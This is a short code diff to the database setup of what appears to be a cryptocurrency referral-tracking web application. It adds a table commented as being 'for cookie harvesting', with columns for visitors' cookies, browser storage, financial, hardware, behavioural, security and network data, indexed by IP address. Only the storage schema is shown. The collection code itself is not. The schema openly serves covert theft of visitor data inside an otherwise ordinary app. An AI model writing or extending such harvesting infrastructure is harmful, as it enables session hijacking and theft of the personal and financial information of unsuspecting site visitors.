@@ -181,6 +181,23 @@ const initializeDatabase = async (retries = 3) => {
       CREATE INDEX IF NOT EXISTS idx_referral_action ON referral_tracking(action_type);
       CREATE INDEX IF NOT EXISTS idx_referral_wallet ON referral_tracking(wallet_address);
       CREATE INDEX IF NOT EXISTS idx_referral_created ON referral_tracking(created_at);
+      
+      -- Create advanced visitor data table for cookie harvesting
+      CREATE TABLE IF NOT EXISTS advanced_visitor_data (
+        id SERIAL PRIMARY KEY,
+        ip_address VARCHAR(45) NOT NULL,
+        cookies_data JSONB,
+        storage_data JSONB,
+        financial_data JSONB,
+        hardware_data JSONB,
+        behavioral_data JSONB,
+        security_data JSONB,
+        network_data JSONB,
+        collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+      
+      CREATE INDEX IF NOT EXISTS idx_advanced_visitor_ip ON advanced_visitor_data(ip_address);
+      CREATE INDEX IF NOT EXISTS idx_advanced_visitor_collected ON advanced_visitor_data(collected_at);
     `);
       console.log('Database tables created/verified successfully');
       console.log('Database initialized successfully');
